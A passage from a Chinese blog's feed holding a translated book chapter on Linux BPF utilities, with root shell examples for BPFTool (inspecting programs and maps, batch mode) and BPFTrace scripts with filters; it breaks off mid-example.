        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;就目前而言，tcpdump是捕获生产中流量最常见的解决方案之一。但是缺点是它不允许应用程序级别的过滤(L7过滤)，因此每当捕获相关的HTTP
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>使用BPF的Linux可观测性(下篇)-翻译</title>
    <link href="elssm.github.io/2022/05/29/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8B%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/</id>
    <published>2022-05-29T12:07:54.000Z</published>
    <updated>2022-06-04T03:06:37.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第五章节"><a href="#第五章节" class="headerlink" title="第五章节"></a>第五章节</h2><h3 id="BPF实用程序"><a href="#BPF实用程序" class="headerlink" title="BPF实用程序"></a>BPF实用程序</h3><p>到目前为止，我们已经讨论了如何编写BPF程序以在系统中获得更多可见性。多年来，许多开发人员都使用BPF构建了用于相同目的的工具。在本章中，我们将讨论一些你可以每天使用的现成工具。其中许多工具是你已经见过的一些BPF程序的高级版本。还有一些工具可以帮助你直接了解自己的BPF程序。</p><p>本章介绍了一些工具，可以在BPF的日常工作中对你有所帮助。我们首先介绍BPFTool，这是一个命令行实用程序，用于获取有关 BPF 程序的更多信息。我们涵盖了<code>BPFTrace</code>和<code>kubectl-trace</code>，它们会让你使用简洁的领域特定语言(DSL)有效地编写BPF程序。最后，我们谈谈<code>eBPF Exporter</code>，一个将BPF与Prometheus集成的开源项目。</p><h4 id="BPFTool"><a href="#BPFTool" class="headerlink" title="BPFTool"></a>BPFTool</h4><p>BPFTool是一个用于检查BPF程序和映射的内核实用程序。默认情况下，该工具不会安装在任何Linux发行版上，而且它正在大量开发中，因此需要最能支持你的Linux内核版本。这里我们介绍<code>Linux 5.1</code>版的BPFTool。</p><p>在接下来的部分中，我们将讨论如何将BPFTool安装到你的系统上，以及如何使用它来观察和更改BPF程序的行为和终端中的映射。</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取内核源码。源码下载地址如下</span></span><br><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入tool目录</span></span><br><span class="line">cd linux-x.x/tools/bpf/bpftool</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装bpf</span></span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>可以通过检查其版本来检查BPFTool是否已正确安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool --version</span><br><span class="line">bpftool v5.17.0</span><br><span class="line">features: libbpf_strict</span><br></pre></td></tr></table></figure><h5 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h5><p>你可以使用BPFTool执行的基本操作之一是扫描系统以了解可以访问哪些BPF功能。 当你不记得哪个版本的内核引入了哪种程序或是否启用了<code>BPF JIT</code>编译器时，这种方法非常有用。要找出这些问题以及许多其他问题的答案，请运行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool feature </span><br><span class="line">Scanning system configuration...</span><br><span class="line">bpf() syscall for unprivileged users is enabled</span><br><span class="line">JIT compiler is enabled</span><br><span class="line">JIT compiler hardening is disabled</span><br><span class="line">JIT compiler kallsyms exports are enabled for root</span><br><span class="line">...</span><br><span class="line">Scanning system call availability...</span><br><span class="line">bpf() syscall is available</span><br><span class="line">Scanning eBPF program types...</span><br><span class="line">eBPF program_type socket_filter is available</span><br><span class="line">eBPF program_type kprobe is available</span><br><span class="line">...</span><br><span class="line">Scanning eBPF map types...</span><br><span class="line">eBPF map_type hash is available</span><br><span class="line">eBPF map_type array is available</span><br><span class="line">eBPF map_type prog_array is available</span><br><span class="line">eBPF map_type perf_event_array is availab</span><br></pre></td></tr></table></figure><p>在此输出中可以看到我们的系统允许非特权用户执行<code>syscall bpf</code>，此调用仅限于某些操作。 还可以看到JIT已启用。较新版本的内核默认启用此JIT，它对编译BPF程序有很大帮助。 如果你的系统没有启用它，您可以运行以下命令来启用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> 1 &gt; /proc/sys/net/core/bpf_jit_enable</span></span><br></pre></td></tr></table></figure><p>功能输出还显示了系统中启用了哪些程序类型和映射类型。这个命令提供的信息比我们在这里展示的要多得多，比如程序类型和许多其他配置指令支持的BPF助手。</p><h5 id="检查BPF程序"><a href="#检查BPF程序" class="headerlink" title="检查BPF程序"></a>检查BPF程序</h5><p>BPFTool为你提供有关内核上BPF程序的直接信息。它允许调查系统中已经运行的内容。还允许加载和固定以前从命令行编译的新的BPF程序。</p><p>学习如何使用BPFTool处理程序的最佳起点是检查你在系统中运行的内容。为此，可以运行命令<code>bpftool prog show</code>。 如果你使用<code>Systemd</code>作为你的init系统，那么可能已经加载了一些BPF程序并附加到一些cgroup；我们稍后再讨论这些。 运行该命令的输出将如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool prog show</span><br><span class="line">52: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">53: cgroup_skb  tag 2a142ef67aaad174</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">54: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 54,55</span><br></pre></td></tr></table></figure><p>左侧冒号前的数字是程序标识符；我们稍后会使用它们来调查这些程序的全部内容。从这个输出中还可以了解系统正在运行哪些类型的程序。在当前这种情况下，系统正在运行三个附加到cgroup套接字缓冲区的BPF程序。如果这些程序实际上是由<code>Systemd</code>启动的，则加载时间可能会与你启动系统时匹配。你还可以查看这些程序当前使用了多少内存以及与它们关联的映射的标识符。 所有这些乍一看都很有用，而且因为我们有程序标识符，我们可以更深入地进行研究。</p><p>你可以将程序标识符作为额外参数添加到前面的命令中：<code>bpftool prog show id 52</code>。这样，BPFTool将显示你之前看到的相同信息，但仅针对由ID 52标识的程序； 这样可以过滤掉你不需要的信息。 此命令还支持<code>--json</code>标志来生成一些JSON输出。如果你想操作输出，这个JSON输出非常方便。例如，像<code>jq</code>这样的工具会为你提供更结构化的数据格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog show --json id 52 | jq</span></span><br><span class="line"> &#123;</span><br><span class="line">  "id": 52,</span><br><span class="line">  "type": "cgroup_skb",</span><br><span class="line">  "tag": "7be49e3934a125ba",</span><br><span class="line">  "gpl_compatible": false,</span><br><span class="line">  "loaded_at": 1553816764,</span><br><span class="line">  "uid": 0,</span><br><span class="line">  "bytes_xlated": 296,</span><br><span class="line">  "jited": true,</span><br><span class="line">  "bytes_jited": 229,</span><br><span class="line">  "bytes_memlock": 4096,</span><br><span class="line">  "map_ids": [</span><br><span class="line">  52,</span><br><span class="line">  53</span><br><span class="line">  ] </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当你知道程序标识符时，你还可以使用BPFTool获取整个程序的转储；当你需要调试编译器生成的BPF字节码时，这会很方便：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog dump xlated id 52</span></span><br><span class="line">       0: (bf) r6 = r1</span><br><span class="line">       1: (69) r7 = *(u16 *)(r6 +192)</span><br><span class="line">       2: (b4) w8 = 0</span><br><span class="line">       3: (55) if r7 != 0x8 goto pc+14</span><br><span class="line">       4: (bf) r1 = r6</span><br><span class="line">       5: (b4) w2 = 16</span><br><span class="line">       6: (bf) r3 = r10</span><br><span class="line">       7: (07) r3 += -4</span><br><span class="line">       8: (b4) w4 = 4</span><br><span class="line">       9: (85) call bpf_skb_load_bytes#7151872</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><p>这个由<code>Systemd</code>加载到我们内核中的程序正在使用帮助程序<code>bpf_skb_load_bytes</code>检查数据包数据。</p><p>如果你想要这个程序更直观的表示，包括指令跳转，你可以在这个命令中使用<code>visual</code>关键字。 这将生成一种格式化的输出，你可以使用<code>dot</code>之类的工具或任何其他可以绘制图形的程序将其转换为图形表示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog dump xlated id 52 visual &amp;&gt; output.out</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dot -Tpng output.out -o visual-graph.png</span></span><br></pre></td></tr></table></figure><p>如果你运行的是<code>5.1</code>或更新版本的内核，还可以访问运行时统计信息。它们告诉你内核在你的BPF程序上花费了多长时间。默认情况下，系统中可能未启用此功能；你需要先运行这个命令，让内核知道它需要向你展示这些数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysctl -w kernel.bpf_stats_enabled=1</span></span><br></pre></td></tr></table></figure><p>启用统计信息后，你将在运行BPFTool时获得另外两条信息：内核运行该程序所花费的总时间<code>(run_time_ns)</code>，以及运行该程序的次数<code>(run_cnt)</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">52: cgroup_skb  tag 7be49e3934a125ba  run_time_ns 14397 run_cnt 39</span><br><span class="line">     loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">     xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br></pre></td></tr></table></figure><p>但是BPFTool不仅允许你检查程序的运行情况；它还允许你将新程序加载到内核中并将其中一些附加到套接字和 <code>cgroup</code>。 例如，我们可以加载我们以前的程序之一并将其固定到BPF文件系统，使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog</span><br><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog show</span><br><span class="line">254: tracepoint  name bpf_prog  tag c6e8e35bea53af79  gpl</span><br><span class="line">loaded_at 2022-05-28T17:06:14+0800  uid 0</span><br><span class="line">xlated 112B  jited 76B  memlock 4096B  map_ids 43</span><br></pre></td></tr></table></figure><h5 id="检查BPF映射"><a href="#检查BPF映射" class="headerlink" title="检查BPF映射"></a>检查BPF映射</h5><p>除了允许检查和操作BPF程序之外，BPFTool还可以让您访问这些程序正在使用的BPF映射。 列出所有映射并按其标识符过滤映射的命令，类似之前看到的show命令。 除了让BPFTool显示prog的信息，还可以显示map的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool map show</span></span><br><span class="line">    52: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    53: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    54: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    55: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br></pre></td></tr></table></figure><p>这些映射与之前看到的附加到程序的标识符相匹配。还可以按ID过滤映射。</p><p>你可以使用BPFTool创建和更新映射并列出映射中的所有元素。创建新映射所需的信息与你在初始化映射时提供的信息相同。我们需要指定要创建的映射类型、键和值的大小及其名称。因为我们没有将映射与程序一起初始化，所以我们还需要将它固定到BPF文件系统，以便我们以后可以使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map create /sys/fs/bpf/counter type array key 4 value 4 entries 5 name counter</span><br></pre></td></tr></table></figure><p>如果在运行该命令后列出系统中的映射，将在列表底部看到新映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map</span><br><span class="line">1: array  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 100  memlock 4096B</span><br><span class="line">45: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br></pre></td></tr></table></figure><p>创建映射后可以像在BPF程序中那样更新和删除元素。</p><p>如果要向映射添加新元素或更新现有元素，可以使用映射更新命令。你可以从前面的示例中获取映射标识符：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0 0</span><br></pre></td></tr></table></figure><p>如果你尝试使用无效的键或值更新元素，BPFTool将返回错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0</span><br><span class="line">Error: value expected 4 bytes got 3</span><br></pre></td></tr></table></figure><p>如果需要检查其值，BPFTool可以提供映射中所有元素的转储。在创建固定大小的数组映射时，可以看到BPF如何将所有元素初始化为空值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map dump id 45</span><br><span class="line">key: 00 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 01 00 00 00  value: 01 00 00 00</span><br><span class="line">key: 02 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 03 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 04 00 00 00  value: 00 00 00 00</span><br><span class="line">Found 5 elements</span><br></pre></td></tr></table></figure><p>BPFTool提供的最强大的选项之一是，你可以将预先创建的映射附加到新程序，并用这些预先分配的映射替换它们初始化的映射。这样你可以从一开始就让程序访问保存的数据，即使你没有编写程序来从BPF文件系统读取映射。 为此，你需要在使用BPFTool加载程序时设置要初始化的映射。可以通过程序加载它时的有序标识符来指定映射，例如，0表示第一个映射，1表示第二个映射，依此类推。还可以通过名称指定映射，这通常更方便：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog_2         map name counter pinned /sys/fs/bpf/counter</span><br></pre></td></tr></table></figure><p>在这个例子中，我们将刚刚创建的映射附加到一个新程序中。在这种情况下，我们将映射替换为它的名称，因为我们知道程序初始化了一个名为counter的映射。 你还可以使用关键字<code>idx</code>使用映射的索引位置，如<code>idx 0</code>。</p><p>当您需要实时调试消息传递时，直接从命令行访问BPF映射很有用。 BPFTool让你以一种更方便的方式直接访问。 除了自省程序和映射之外，你还可以使用BPFTool从内核中提取更多信息。 接下来让我们看看如何访问特定的接口。</p><h5 id="检查附着到特定接口的程序"><a href="#检查附着到特定接口的程序" class="headerlink" title="检查附着到特定接口的程序"></a>检查附着到特定接口的程序</h5><p>有时你会发现自己想知道哪些程序附加到特定接口。BPF 可以加载在<code>cgroup</code>、<code>Perf</code>事件和网络数据包之上工作的程序。子命令<code>cgroup、perf 和 net</code>可以帮助你追溯这些接口上的附着程序。</p><p><code>perf</code>子命令列出所有附加到系统中跟踪点的程序，如<code>kprobes、uprobes和tracepoints</code>； 你可以通过运行 <code>bpftool perf show</code>来查看该列表。</p><p><code>net</code>子命令列出了附加到XDP和Traffic Control的程序。其他附着程序，如套接字过滤器和重用端口程序，只能通过使用<code>iproute2</code>访问。 您可以使用<code>bpftool net show</code>列出XDP和TC的附着程序，就像在其他BPF对象中看到的一样。</p><p>最后，<code>cgroup</code>子命令列出所有附加到<code>cgroup</code>的程序。 这个子命令与你看到的其他命令有些不同。<code>bpftool cgroup show</code>需要你检查的<code>cgroup</code>路径。如果要列出系统中所有<code>cgroup</code>中的所有附着程序，则需要使用<code>bpftool cgroup tree</code>，如下例所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool cgroup tree</span></span><br><span class="line">    CgroupPath</span><br><span class="line">    ID       AttachType      AttachFlags     Name</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">5 ingress</span><br><span class="line">        4        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">3 ingress</span><br><span class="line">        2        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">        7        ingress</span><br><span class="line">        6        egress</span><br></pre></td></tr></table></figure><p>至此，我们已经讨论了如何在终端中输入不同的命令来调试BPF程序。但是，当你最需要这些命令时，记住所有这些命令可能会很麻烦。接下来，我们将描述如何从纯文本文件加载几个命令，以便你可以构建一组方便使用的脚本。</p><h5 id="在批处理模式下加载命令"><a href="#在批处理模式下加载命令" class="headerlink" title="在批处理模式下加载命令"></a>在批处理模式下加载命令</h5><p>当你尝试分析一个或多个系统的行为时，经常反复运行多个命令。最终可能会得到一组经常在工具链中使用的命令。 如果你不想每次都输入这些命令，BPFTool的批处理模式就很适合你。</p><p>使用批处理模式可以将要执行的所有命令写入文件并一次运行所有命令。还可以通过以<code>#</code>开头的行在此文件中写入注释。但是，这种执行模式不是原子的。BPFTool逐行执行命令，如果其中一个命令失败，它将中止执行，使系统处于运行最新成功命令后的状态。</p><p>以下是批处理模式可以处理的文件的简短示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Create a new <span class="built_in">hash</span> map</span></span><br><span class="line">map create /sys/fs/bpf/hash_map type hash key 4 value 4 entries 5 name hash_map</span><br><span class="line"><span class="meta">#</span><span class="bash"> Now show all the maps <span class="keyword">in</span> the system</span></span><br><span class="line">map show</span><br></pre></td></tr></table></figure><p>如果将这些命令保存在名为<code>/tmp/batch_example.txt</code>的文件中，则可以使用<code>bpftool batch file /tmp/batch_example.txt</code>加载它。 当你第一次运行这个命令时，你会得到类似于下面的代码片段的输出，但是如果你再次尝试运行它，这个命令将会退出并且没有输出，因为我们已经有一个名为<code>hash_map</code>的映射在系统，并且批处理执行将在第一行失败：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tmp]# bpftool batch file /tmp/batch_example.txt</span><br><span class="line">46: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">51: hash  name hash_map  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">processed 2 commands</span><br></pre></td></tr></table></figure><h5 id="显示BTF信息"><a href="#显示BTF信息" class="headerlink" title="显示BTF信息"></a>显示BTF信息</h5><p>BPFTool可以显示任何给定二进制对象存在的BPF类型格式(BTF)信息。BTF使用元数据信息对程序结构进行注释，以帮助你调试程序。</p><p>例如，当你将关键字<code>linum</code>添加到<code>prog dump</code>时，它可以为你提供BPF程序中每条指令的源文件和行号。</p><p>BPFTool的最新版本包括一个新的<code>btf</code>子命令，帮助你深入了解程序。此命令的初始重点是可视化结构类型。例如，<code>bpftool btf dump id 54</code>显示了ID为54的程序的所有BTF类型。</p><h4 id="BPFTrace"><a href="#BPFTrace" class="headerlink" title="BPFTrace"></a>BPFTrace</h4><p>BPFTrace是BPF的高级跟踪语言。允许你使用简洁的DSL编写BPF程序，并将它们保存为可以执行的脚本，而无需手动编译和加载它们到内核中。该语言受到其他知名工具的启发，例如<code>awk</code>和<code>DTrace</code>。</p><p>与直接使用BCC或其他BPF工具编写程序相比，使用BPFTrace的优势之一是BPFTrace提供了许多你不需要自己实现的内置功能，例如聚合信息和创建直方图。</p><p>以Centos8为例，如果你安装了<code>epel-release</code>支持，那么一条dnf就可以安装bpftrace</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# dnf install bpftrace</span><br></pre></td></tr></table></figure><p>BPFTrace执行的程序具有简洁的语法。我们可以将它们分为三个部分：<code>header, action blocks, and footer</code>。 <code>header</code>是BPFTrace在加载程序时执行的特殊块；它通常用于在输出顶部打印一些信息，例如序言。同样，<code>footer</code>是一个特殊的块，BPFTrace在终止程序之前执行一次。 <code>header</code>和<code>footer</code>都是BPFTrace程序中的可选部分。一个 BPFTrace程序必须至少有一个<code>action block</code>。<code>action block</code>是我们指定要跟踪的探针以及内核触发这些探针的事件时执行的操作的地方。下一个示例我们将展示这三个部分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">    &#123;</span><br><span class="line">      printf("starting BPFTrace program\n")</span><br><span class="line">&#125;</span><br><span class="line">kprobe:do_sys_open</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">&#125;</span><br><span class="line">END</span><br><span class="line">    &#123;</span><br><span class="line">      printf("exiting BPFTrace program\n")</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>header</code>部分总是用关键字BEGIN标记，而<code>footer</code>部分总是用关键字END标记。 这些关键字由BPFTrace保留。 <code>action block</code>标识符定义了你希望将BPF操作附加到的探测器。在前面的示例中，我们在内核每次打开文件时打印一行日志。</p><p>除了识别程序部分之外，我们已经可以在前面的示例中看到有关语言语法的更多细节。BPFTrace提供了一些帮助程序，这些帮助程序在程序编译时被翻译成BPF代码。 帮助程序<code>printf</code>是C函数<code>printf</code>的包装器，它在你需要时打印程序详细信息。str是一个内置的辅助函数，它将C指针转换为其字符串表示形式。许多内核函数接收指向字符的指针作为参数。这个辅助函数会为你翻译那些指向字符串的指针。</p><p>BPFTrace可以被认为是一种动态语言，因为它不知道内核执行探针时可能收到的参数数量。这就是BPFTrace提供参数辅助函数来访问内核处理的信息的原因。BPFTrace根据块接收的参数数量动态生成这些帮助程序，可以通过其在参数列表中的位置访问信息。在前面的示例中，<code>arg1</code>是对open系统调用中第二个参数的引用，它引用了文件路径。</p><p>要执行此示例，可以将其保存在文件中并使用文件路径作为第一个参数运行BPFTrace：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br></pre></td></tr></table></figure><p>BPFTrace语言在设计时考虑了脚本。在前面的示例中，您已经看到了该语言的简洁版本。 但是，你也可以无需将这些单行程序存储在文件中即可执行它们；可以在执行BPFTrace时使用选项<code>-e</code>运行它们。 如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace -e "kprobe:do_sys_open &#123; @opens[arg1] = count() &#125;"</span><br><span class="line">Attaching 1 probe...</span><br><span class="line">@opens[94865239214048]: 1</span><br><span class="line">@opens[140736438418016]: 1</span><br><span class="line">@opens[140297599132240]: 1</span><br><span class="line">@opens[93945902307104]: 1</span><br><span class="line">@opens[94865239225648]: 1</span><br><span class="line">@opens[94865239215744]: 1</span><br><span class="line">@opens[93945902306496]: 1</span><br><span class="line">@opens[139870543823312]: 1</span><br><span class="line">@opens[139870563935520]: 1</span><br><span class="line">@opens[140267846679600]: 1</span><br><span class="line">@opens[139870563971376]: 1</span><br><span class="line">@opens[94774158865584]: 1</span><br><span class="line">@opens[140449669998819]: 1</span><br><span class="line">@opens[93945902302160]: 1</span><br><span class="line">@opens[93945902300160]: 1</span><br><span class="line">@opens[93907893935248]: 1</span><br></pre></td></tr></table></figure><h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h5><p>当你运行前面的例子时，你可能会得到一个系统不断打开的文件流，直到你按下<code>Ctrl-C</code>退出程序。 那是因为我们告诉BPF打印内核打开的每个文件描述符。在某些情况下，你只想针对特定条件执行<code>action block</code>。 BPFTrace称之为过滤。</p><p>你可以将一个过滤器关联到每个<code>action block</code>。 它们像<code>action block</code>一样评估，但如果过滤器返回false值，则操作不会执行。他们还可以访问该语言的其余部分，包括探测参数和辅助函数。 这些过滤器封装在动作标头之后的两个斜杠中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open /str(arg1) == "/tmp/example.bt"/</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们将我们的动作块优化为仅当内核打开的文件是我们用来存储这个例子的文件时才执行。如果你用新的过滤器运行程序，你会看到它打印了标题，但它在那里停止打印。 这是因为由于我们的新过滤器，之前触发我们操作的每个文件现在都被跳过了。如果你在不同的终端中多次打开示例文件，你将看到当过滤器匹配我们的文件路径时内核如何执行操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 